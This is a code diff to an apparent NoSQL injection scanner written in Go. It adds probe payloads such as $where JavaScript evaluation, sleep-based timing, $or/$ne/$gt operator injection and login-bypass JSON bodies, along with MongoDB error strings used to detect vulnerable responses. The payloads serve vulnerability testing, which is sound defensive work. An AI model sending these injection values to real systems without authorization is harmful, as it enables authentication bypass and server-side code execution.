@@ -35,12 +35,19 @@ func Probes(param string) []Probe {
 		{Name: "gt_operator", Value: `{"$gt":""}`, Signal: "operator_injection", Mode: "query"},
 		{Name: "regex_operator", Value: `{"$regex":".*"}`, Signal: "regex_injection", Mode: "query"},
 		{Name: "where_js", Value: `{"$where":"this.password.match(/.*/)"}`, Signal: "where_injection", Mode: "query"},
+		{Name: "where_eval", Value: `{"$where":"(function(){throw new Error(\"AKCA_NOSQL_\"+(71*73)+\"_EVAL\")})()"}`, Signal: "where_eval_injection", Mode: "query"},
+		{Name: "where_sleep", Value: `{"$where":"sleep(5000)"}`, Signal: "where_injection", Mode: "query"},
+		{Name: "or_operator", Value: `{"$or":[{"` + param + `":{"$ne":""}},{"password":{"$ne":""}}]}`, Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
+		{Name: "exists_operator", Value: `{"$exists":true}`, Signal: "operator_injection", Mode: "query"},
+		{Name: "in_operator", Value: `{"$in":["admin","root","user"]}`, Signal: "operator_injection", Mode: "query"},
+		{Name: "expr_gt", Value: `{"$expr":{"$gt":["$password",""]}}`, Signal: "operator_injection", Mode: "query"},
 		{Name: "js_truthy", Value: `' || '1'=='1`, Signal: "js_injection", Mode: "query"},
 		{Name: "json_login_bypass", Value: buildLoginBypassJSON(param), Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
 		{Name: "json_ne_bypass", Value: buildNEBypassJSON(param), Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
 		{Name: "json_gt_pair", Value: `{"` + param + `":{"$gt":""},"password":{"$gt":""}}`, Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
 		{Name: "bracket_ne", Value: "", Signal: "bracket_injection", Mode: "bracket_query"},
 		{Name: "bracket_gt", Value: "", Signal: "bracket_injection", Mode: "bracket_query"},
+		{Name: "bracket_regex", Value: "", Signal: "bracket_injection", Mode: "bracket_query"},
 	}
 }
 
@@ -157,11 +164,13 @@ func IsLoginLikeEndpoint(endpointURL string) bool {
 	return false
 }
 
-// Mongo-specific error strings (avoid generic "syntax error", "javascript", etc.).
+// Mongo and in-memory engine error strings (avoid generic "syntax error", "javascript", etc.).
 var mongoErrorMarkers = []string{
 	"mongoerror", "mongoservererror", "unknown operator", "bad query",
 	"invalid bson", "failed to parse", "cast to objectid failed",
 	"bson type", "cannot use type", "$where not allowed", "unrecognized field",
+	"in csp mode, sift does not support strings", "in \"$where\" condition",
+	"function compilation failed", "evalmachine.<anonymous>",
 }
 
 var authFailureMarkers = []string{
@@ -191,6 +200,9 @@ func AnalyzeWithContext(ctx ResponseContext, probe Probe) (bool, string) {
 	if ctx.ProbeBody == "" {
 		return false, ""
 	}
+	if strings.Contains(ctx.ProbeBody, "AKCA_NOSQL_5183_EVAL") {
+		return true, "nosql_code_execution_eval"
+	}
 	probeLower := strings.ToLower(ctx.ProbeBody)
 	baseLower := strings.ToLower(ctx.BaselineBody)
 	controlLower := strings.ToLower(ctx.ControlBody)
@@ -202,7 +214,7 @@ func AnalyzeWithContext(ctx ResponseContext, probe Probe) (bool, string) {
 	switch probe.Signal {
 	case "auth_bypass":
 		return analyzeAuthBypass(ctx, probeLower, baseLower, controlLower)
-	case "operator_injection", "regex_injection", "where_injection", "js_injection", "bracket_injection":
+	case "operator_injection", "regex_injection", "where_injection", "where_eval_injection", "js_injection", "bracket_injection":
 		// Operator probes only report on Mongo error disclosure (handled above).
 		return false, ""
 	default:
